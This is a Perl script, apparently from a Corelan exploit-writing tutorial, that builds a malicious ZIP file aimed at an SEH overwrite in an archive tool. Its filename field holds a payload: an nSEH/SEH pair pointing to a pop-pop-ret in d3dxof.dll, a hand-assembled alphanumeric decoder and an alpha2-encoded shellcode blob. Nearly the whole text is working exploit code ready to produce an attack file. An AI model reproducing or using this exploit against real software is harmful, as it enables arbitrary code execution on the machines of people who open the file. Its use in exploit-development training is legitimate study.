my $filename="corelan2.zip";
my $ldf_header = "\x50\x4B\x03\x04\x14\x00\x00".
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00" .
"\xe4\x0f" .
"\x00\x00\x00";

my $cdf_header = "\x50\x4B\x01\x02\x14\x00\x14".
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" .
"\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\xe4\x0f".
"\x00\x00\x00\x00\x00\x00\x01\x00".
"\x24\x00\x00\x00\x00\x00\x00\x00";

my $eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00".
"\x00\x01\x00\x01\x00".
"\x12\x10\x00\x00".
"\x02\x10\x00\x00".
"\x00\x00";

my $nseh="\x41\x41\x41\x41";  #INC ECX = NOP
my $seh="\x65\x47\x7e\x6d";   #pop pop ret from d3dxof.dll = NOP

my $payload = "B" x 297 . $nseh . $seh;  #B = INC EDX
#pop ecx, pop ecx, pop ecx, push ecx, pop esp
my $predecoder = "\x59\x59\x59\x51\x5c"; 

my $decoder="\x25\x4A\x4D\x4E\x55".  #zero eax
"\x25\x35\x32\x31\x2A".
"\x2D\x55\x55\x55\x5F".    #put value in eax
"\x2D\x55\x55\x55\x5F".
"\x2D\x56\x55\x56\x5F".
"\x50".                     #push eax
"\x25\x4A\x4D\x4E\x55".     #zero eax
"\x25\x35\x32\x31\x2A".
"\x2D\x2A\x6A\x31\x55".     #put value in eax
"\x2D\x2A\x6A\x31\x55".
"\x2D\x2B\x5A\x30\x55".
"\x50".                     #push eax
"\x73\xf7";                 #jump back 101 bytes

$payload=$payload.$predecoder.$decoder;
my $filltoecx="B" x (100-length($predecoder.$decoder));

#alpha2 encoded - skylined - basereg ECX
my $shellcode = "IIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABT".
"AAQ2AB2BB0BBXP8ACJJIN9JKMKXYBTGTJTVQ9B82BZVQYYE4LK2Q6P".
"LKBVTLLKT65LLK0F38LKCNWPLKP6VX0ODX3EKCF95QHQKOKQE0LK2L".
"Q4FDLK1UWLLK64S5BXUQJJLK1Z5HLK1JQ0UQJKM3P7PILKWDLKUQJN".
"P1KO6QO0KLNLMTO02T4JIQXOTMS1O7M9JQKOKOKO7KCLFD18RU9NLK".
"PZQ45QJKCVLKTLPKLKPZ5L31ZKLK5TLKUQM8MYQTQ45L3Q9SNRUX7Y".
"N4MYKUMYO258LNPNTNZLV2KXMLKOKOKOK9W534OK3NN8JBBSLGELQ4".
"PRJHLKKOKOKOMY1UTHSXBLBL7PKOSXP36RVNE4U8CEBSSUT2LH1LWT".
"UZK9JFPVKO0US4K9IR60OKOXORPMOLMW5LQ4F2M81NKOKOKO2HPLW1".
"PNF8U8W3POV275P1IKK81LWT37MYKSU8BRT31HWPRH2SCYSDRO3XSW".
"102VSY3XWPQR2LBOCXT259RT49U80S3UBC2U58CYRVSUWPSX56E5BN".
"T3U82L7PPOCVSX2OQ0SQRLRHRIRNQ04458WPCQSWU1SX3CQ0SXRI2H".
"WPBSU1RYU8P0CTFSBRE8RL3Q2NU3CXRC2OD2U56QHIK80LGT1RK9KQ".
"VQN2F2PSPQ0RKON0P1IPPPKO0U5XA";

my $rest = "C" x  (4064-length($payload.$filltoecx.$shellcode)) . ".txt";
$payload = $payload.$filltoecx.$shellcode.$rest;

print "Payload size : " . length($payload)."\n";
print "[+] Removing $filename\n";
system("del $filename");
print "[+] Creating new $filename\n";
open(FILE, ">$filename");
print FILE $ldf_header.$payload.$cdf_header.$payload.$eofcdf_header;
close(FILE);
